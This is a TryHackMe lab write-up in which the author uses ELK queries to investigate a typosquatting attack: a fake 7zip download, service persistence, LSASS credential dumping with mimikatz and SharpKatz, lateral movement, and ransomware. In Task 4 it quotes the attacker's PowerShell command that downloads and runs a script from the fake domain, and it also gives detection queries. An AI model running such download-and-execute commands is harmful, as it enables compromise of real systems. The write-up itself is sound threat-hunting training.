# TryHackMe Room: Hunt Me II: Typo Squatters

In this room, I continued my threat hunting journey using the ELK stack. The scenario involved a user falling victim to a "typosquatting" attack—downloading software from a fake domain that mimics a legitimate one. My goal was to investigate the compromised endpoint, track the attacker's lateral movement, and identify the impact of the attack.

---

## Section: Scenario Investigation

### Task 1: What is the URL of the malicious software that was downloaded by the victim user?

The scenario briefing mentioned that the user intended to download 7zip, and the screenshot showed the legitimate site 7zip.org. To find the malicious activity, I searched for logs related to the keyword 7zip to see if the user visited any look-alike domains.

*7zip*

I sorted the results by "Newest" to see the most recent activity. I found a download request from a typosquatted domain (7zipp.org), which revealed the full URL and the name of the malicious installer.

[Screenshot 01: Malicious URL and filename](./screenshots/01-malicious-url.png)

### Task 2: What is the IP address of the domain hosting the malware?

To find the IP address resolution for this malicious domain, I added a filter for network.protocol set to dns. Examining the dns.resolved_ip field provided the answer.

[Screenshot 02: Malicious domain IP](./screenshots/02-malicious-ip.png)

### Task 3: What is the PID of the process that executed the malicious software?

From Task 1, I knew the downloaded file was named 7z2301-x64.msi. I searched for this filename and added the columns process.pid, process.command_line, and file.path to the view. This allowed me to see the execution event and identify the Process ID (PID) associated with the malware installation.

[Screenshot 03: PID of the malicious process](./screenshots/03-malicious-pid.png)

### Task 4: Following the execution chain of the malicious payload, another remote file was downloaded and executed. What is the full command line value of this suspicious activity?

Looking at the command line arguments from the previous screenshot (or by following the process tree), I saw that the MSI installer triggered a PowerShell command. This command reached out to the fake domain to download and execute a script named 7z.ps1.

The command was: powershell.exe iex(iwr http://www.7zipp.org/a/7z.ps1 -useb)

### Task 5: The newly downloaded script also installed the legitimate version of the application. What is the full file path of the legitimate installer?

To understand what the malicious script did next, I searched for the script name and filtered for processes spawned by the malicious PowerShell command found in Task 4.

7z.ps1 AND process.parent.command_line : "powershell.exe iex(iwr http://www.7zipp.org/a/7z.ps1 -useb)"

The logs showed that to maintain the illusion of legitimacy, the script installed the real 7zip application. The full file path was visible in the process execution logs.

[Screenshot 04: Legitimate 7zip installer path](./screenshots/04-legit-installer-path.png)

### Task 6: What is the name of the service that was installed?

In the same logs examined above, I observed the installation of a persistence mechanism. The attacker installed a new service named 7zService.

### Task 7: The attacker was able to establish a C2 connection after starting the implanted service. What is the username of the account that executed the service?

I added the user.name field to my current view of the service installation/execution events. This revealed the account context in which the malicious service was running.

[Screenshot 05: User account executing the service](./screenshots/05-service-user.png)

### Task 8: After dumping LSASS data, the attacker attempted to parse the data to harvest the credentials. What is the name of the tool used by the attacker in this activity?

Credential dumping often involves the Local Security Authority Subsystem Service (LSASS). Based on knowledge from previous rooms, I searched for the artifact lsass.dmp.

*lsass.dmp*

There was a single hit. Examining the process that handled this dump file revealed the tool used by the attacker.

[Screenshot 06: Tool used for parsing LSASS dump](./screenshots/06-lsass-tool.png)

### Task 9: What is the credential pair that the attacker leveraged after the credential dumping activity? (format: username:hash)

I searched for common credential dumping tools like Mimikatz, DumpCreds, or Sekurlsa within the command line arguments, specifically filtering for Process Creation events (Event ID 1).

winlog.event_id: 1 AND process.command_line: (*mimikatz* OR *DumpCreds* OR *sekurlsa*)

The output showed the attacker successfully harvesting a username and its NTLM hash.

[Screenshot 07: Credential dump (Username and Hash)](./screenshots/07-cred-dump.png)

### Task 10: After gaining access to the new account, the attacker attempted to reset the credentials of another user. What is the new password set to this target account?

The previous task revealed that the tool was running under the user anna.jones. This gave me a pivot point. I searched for all Process Creation events (Event ID 1) associated with user.name: anna.jones and looked at the process.command_line.

I found a net users command used to reset the password for the account anna.jones.

[Screenshot 08: Password reset command](./screenshots/08-password-reset.png)

### Task 11: What is the name of the workstation where the new account was used?

I filtered for activity involving the user anna.jones.

winlog.event_id: 1 AND user.name:anna*

The logs showed activity starting on WKSTN-03, but then the attacker moved laterally, and the hostname changed to WKSTN-02.

[Screenshot 09: Hostname change indicating lateral movement](./screenshots/09-lateral-movement-hostname.png)

### Task 12: After gaining access to the new workstation, a new set of credentials was discovered. What is the username, including its domain, and password of this new account?

I scrolled through the logs on the new workstation, looking for command-line activity similar to the previous password reset or credential usage. I found the attacker using a new set of credentials (domain\user and password) in cleartext within a command.

[Screenshot 10: New credentials discovered](./screenshots/10-new-credentials.png)

### Task 13: Aside from mimikatz, what is the name of the PowerShell script used to dump the hash of the domain admin?

Continuing my analysis of the timeline, I noticed the attacker using PowerView (a familiar tool). Shortly after, I saw the execution of Invoke-SharpKatz. A quick check (or GitHub search) confirms that SharpKatz is a C# port of Mimikatz logic used for dumping secrets.

[Screenshot 11: Invoke-SharpKatz script usage](./screenshots/11-sharpkatz-script.png)

### Task 14: What is the AES256 hash of the domain admin based on the credential dumping output?

I needed to see the output of the Invoke-SharpKatz script. I constructed a query to search for the script name and the target user ("hall").

"*Invoke-SharpKatz*" AND message:"*hall*"

The message field contained the script's output, including the AES256 hash for the domain admin.

[Screenshot 12: Domain Admin AES256 hash](./screenshots/12-aes256-hash.png)

### Task 15: After gaining domain admin access, the attacker popped ransomware on workstations. How many files were encrypted on all workstations?

Recall from Task 1 (and the initial search for *7zip*) that alongside the malicious installer, another file named bomb.exe was downloaded from the fake domain. This was likely the ransomware payload.

To find the number of encrypted files, I searched for the ransomware binary and correlated it with Event ID 11 (Sysmon File Create/Overwrite), which indicates file modification.

bomb.exe AND winlog.event_id:11

The search returned 48 hits, indicating 48 files were encrypted.

[Screenshot 13: Count of encrypted files](./screenshots/13-encrypted-files-count.png)

---

# Summary

This room was a comprehensive exercise in tracking an adversary through the lifecycle of a typosquatting attack. I learned to:

- Identify Initial Access: Finding the typosquatted domain and the malicious payload delivery via PowerShell.
- Track Persistence: Spotting the installation of a malicious service (7zService).
- Detect Credential Dumping: Hunting for tools like Mimikatz, LSASS dumps, and SharpKatz.
- Follow Lateral Movement: Tracing the attacker across workstations (WKSTN-03 to WKSTN-02) using compromised credentials.
- Assess Impact: Quantifying the damage of the ransomware deployment by analyzing file modification events.